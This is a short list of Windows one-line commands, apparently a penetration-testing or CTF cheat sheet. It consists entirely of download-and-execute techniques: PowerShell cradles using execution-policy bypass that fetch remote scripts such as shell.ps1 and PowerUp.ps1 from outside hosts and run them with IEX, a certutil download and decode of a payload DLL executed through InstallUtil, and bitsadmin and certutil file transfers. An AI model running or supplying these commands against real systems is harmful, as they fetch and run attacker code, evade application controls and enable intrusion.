powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://1xx/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://xx:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://1xx:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile

certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll


bitsadmin /transfer myDownloadJob /download /priority normal http://1xx:8080 c:\test.txt


certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
